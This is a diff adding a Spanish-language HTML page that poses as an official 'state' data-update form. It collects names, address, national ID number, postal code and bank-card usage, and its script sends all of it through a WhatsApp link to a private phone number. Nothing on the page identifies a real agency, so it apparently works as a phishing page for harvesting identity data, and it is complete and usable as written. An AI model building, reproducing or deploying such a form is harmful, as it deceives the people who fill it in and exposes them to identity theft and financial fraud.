@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<title>Actualización de Datos</title>
+<style>
+body { font-family: Arial; padding: 20px; background: #f3f3f3; }
+form { background: white; padding: 20px; border-radius: 10px; }
+input, select { width: 100%; padding: 10px; margin-bottom: 12px; }
+button { background: green; color: white; padding: 12px; width: 100%; border: none; border-radius: 6px; font-size: 16px; }
+</style>
+</head>
+<body>
+
+<h2>Actualización de Datos - Estado</h2>
+
+<form id="form">
+  <label>Nombre:</label>
+  <input type="text" id="nombre" required>
+
+  <label>Apellido:</label>
+  <input type="text" id="apellido" required>
+
+  <label>Dirección:</label>
+  <input type="text" id="direccion" required>
+
+  <label>Cédula de Identidad:</label>
+  <input type="text" id="cedula" required>
+
+  <label>Código Postal:</label>
+  <input type="text" id="postal" required>
+
+  <label>¿Usa tarjetas bancarias?</label>
+  <select id="tarjetas">
+    <option value="No">No</option>
+    <option value="Crédito">Tarjeta de crédito</option>
+    <option value="Débito">Tarjeta de débito</option>
+    <option value="Ambas">Ambas</option>
+  </select>
+
+  <button type="button" onclick="enviar()">Enviar por WhatsApp</button>
+</form>
+
+<script>
+function enviar() {
+  let nombre = document.getElementById("nombre").value;
+  let apellido = document.getElementById("apellido").value;
+  let direccion = document.getElementById("direccion").value;
+  let cedula = document.getElementById("cedula").value;
+  let postal = document.getElementById("postal").value;
+  let tarjetas = document.getElementById("tarjetas").value;
+
+  let mensaje =
+    "ACTUALIZACIÓN DE DATOS%0A%0A" +
+    "Nombre: " + nombre + "%0A" +
+    "Apellido: " + apellido + "%0A" +
+    "Dirección: " + direccion + "%0A" +
+    "Cédula: " + cedula + "%0A" +
+    "Código Postal: " + postal + "%0A" +
+    "Tarjetas: " + tarjetas;
+
+  window.location.href = "https://wa.me/59899882398?text=" + mensaje;
+}
+</script>
+
+</body>
+</html>
